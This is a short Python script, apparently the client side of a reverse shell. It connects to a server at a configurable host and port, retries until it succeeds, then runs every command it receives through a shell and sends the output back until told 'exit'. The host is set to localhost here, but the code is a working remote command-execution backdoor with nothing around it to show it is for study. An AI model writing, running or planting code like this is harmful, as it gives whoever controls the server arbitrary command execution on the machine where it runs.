import socket
import subprocess
import time

def run_worker():
    host = '127.0.0.1'  
    port = 80
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print("Searching for server...")
    while True:
        try:
            client.connect((host, port))
            print("Connected to server!")
            break  
        except socket.error:
            time.sleep(2)
            continue

    while True:
        command = client.recv(1024).decode('utf-8')
        if command.lower() == "exit": break
        
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output 
        except Exception as e:
            output = str(e).encode('utf-8')    
            
        client.sendall(output)

    client.close()

if __name__ == "__main__":
    run_worker()
